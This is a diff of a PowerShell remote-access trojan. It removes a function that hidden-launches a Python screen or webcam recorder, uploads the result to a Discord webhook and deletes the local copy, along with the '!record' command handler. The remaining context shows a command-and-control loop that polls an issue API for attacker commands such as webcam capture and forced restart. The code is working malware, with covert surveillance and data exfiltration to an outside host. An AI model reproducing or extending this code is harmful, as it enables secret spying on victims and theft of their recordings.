@@ -229,69 +229,6 @@ function Open-URL {
     return $false
 }
 
-function Start-RecordingAndSend {
-    # Define the path to your Python script
-    # Change this if your script is located elsewhere
-    $pythonScriptPath = ".\record.pyw" 
-    
-    # Define the output file path your Python script will create
-    # Change this to match the output file from your script
-    $outputFilePath = "$env:temp\recording.mp4" 
-
-    # Define a unique name for the file when sending
-    $fileName = "recording_$([datetime]::Now.ToString('yyyyMMdd_HHmmss')).mp4"
-
-    try {
-        # Check if the Python script exists before trying to run it
-        if (-not (Test-Path $pythonScriptPath)) {
-            $errorBody = @{ content = "❌ Recording script not found at: $pythonScriptPath" } | ConvertTo-Json
-            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorBody -ContentType "application/json"
-            return
-        }
-
-        # Start the Python script silently in the background
-        # -WindowStyle Hidden ensures no console window appears
-        # -PassThru returns the process object so we can track it
-        $process = Start-Process -FilePath "python.exe" -ArgumentList "`"$pythonScriptPath`" `"$outputFilePath`"" -WindowStyle Hidden -PassThru
-
-        # Wait for 35 seconds for the recording to complete
-        Start-Sleep -Seconds 35
-
-        # Check if the process is still running and kill it if necessary
-        if (-not $process.HasExited) {
-            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
-        }
-
-        # Check if the output file was created
-        if (Test-Path $outputFilePath) {
-            # Use your existing function to send the file
-            $success = Send-File-ToDiscord -filePath $outputFilePath -fileName $fileName -fileSize (Get-Item $outputFilePath).Length
-
-            if ($success) {
-                # Clean up the temporary file after sending
-                Remove-Item $outputFilePath -ErrorAction SilentlyContinue
-            }
-        } else {
-            # If the file was not created, send an error message
-            $errorBody = @{ content = "❌ Recording failed. Output file not found at: $outputFilePath" } | ConvertTo-Json
-            if ($session_webhook -and $session_webhook -ne "pending") {
-                Invoke-RestMethod -Uri $session_webhook -Method Post -Body $errorBody -ContentType "application/json"
-            } else {
-                Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorBody -ContentType "application/json"
-            }
-        }
-    }
-    catch {
-        # Catch any other errors during the process
-        $errorBody = @{ content = "❌ An error occurred during recording: $($_.Exception.Message)" } | ConvertTo-Json
-        if ($session_webhook -and $session_webhook -ne "pending") {
-            Invoke-RestMethod -Uri $session_webhook -Method Post -Body $errorBody -ContentType "application/json"
-        } else {
-            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorBody -ContentType "application/json"
-        }
-    }
-}
-
 function Restart-Computer {
     try {
         Start-Process "shutdown.exe" -ArgumentList "/r", "/f", "/t", "0" -Wait
@@ -619,18 +556,6 @@ while($true) {
                 Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                 $last_command = "none"
             }
-                    # ... your other elseif blocks for !webcam, !restart, etc. ...
-
-            elseif($fixedCommand -eq "!record") {
-                # Start the recording process
-                Start-RecordingAndSend
-            
-                # Reset the command to 'none' to prevent re-running
-                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
-                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
-                $last_command = "none"
-            }
-
         }
         Start-Sleep 5
     }
@@ -640,3 +565,5 @@ while($true) {
         Start-Sleep 30
     }
 }
+
+
